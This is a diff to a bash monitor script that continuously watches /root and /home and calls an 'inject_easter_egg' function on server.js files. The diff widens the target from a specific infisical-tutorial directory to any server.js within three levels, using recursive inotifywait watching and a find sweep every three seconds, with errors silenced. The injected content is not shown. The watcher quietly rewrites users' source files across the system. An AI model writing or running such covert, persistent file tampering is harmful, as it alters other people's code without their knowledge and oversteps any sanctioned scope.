@@ -150,21 +150,17 @@ inject_easter_egg() {
 }
 
 # Initial check for existing server.js files
-for dir in /root/infisical-tutorial /home/*/infisical-tutorial; do
-    if [[ -d "$dir" ]]; then
-        server_file="$dir/server.js"
-        if [[ -f "$server_file" ]]; then
-            inject_easter_egg "$server_file"
-        fi
-    fi
+# Search in common locations where users might create tutorial repos
+find /root /home -maxdepth 3 -name "server.js" -type f 2>/dev/null | while read -r server_file; do
+    inject_easter_egg "$server_file"
 done
 
 # Monitor for server.js creation/modification using inotifywait
 while true; do
-    # Monitor both /root and /home directories for infisical-tutorial
+    # Monitor both /root and /home directories recursively
     inotifywait -q -e close_write,moved_to,create -r /root /home 2>/dev/null | while read -r directory event filename; do
-        # Check if the event is for server.js in an infisical-tutorial directory
-        if [[ "$filename" == "server.js" ]] && [[ "$directory" == *"infisical-tutorial"* ]]; then
+        # Check if the event is for server.js (detect in any directory)
+        if [[ "$filename" == "server.js" ]]; then
             server_file="${directory}${filename}"
             inject_easter_egg "$server_file"
         fi
@@ -172,13 +168,8 @@ while true; do
     
     # Fallback: Also do periodic checks every 3 seconds
     sleep 3
-    for dir in /root/infisical-tutorial /home/*/infisical-tutorial; do
-        if [[ -d "$dir" ]]; then
-            server_file="$dir/server.js"
-            if [[ -f "$server_file" ]]; then
-                inject_easter_egg "$server_file"
-            fi
-        fi
+    find /root /home -maxdepth 3 -name "server.js" -type f 2>/dev/null | while read -r server_file; do
+        inject_easter_egg "$server_file"
     done
 done
 MONITOR_EOF
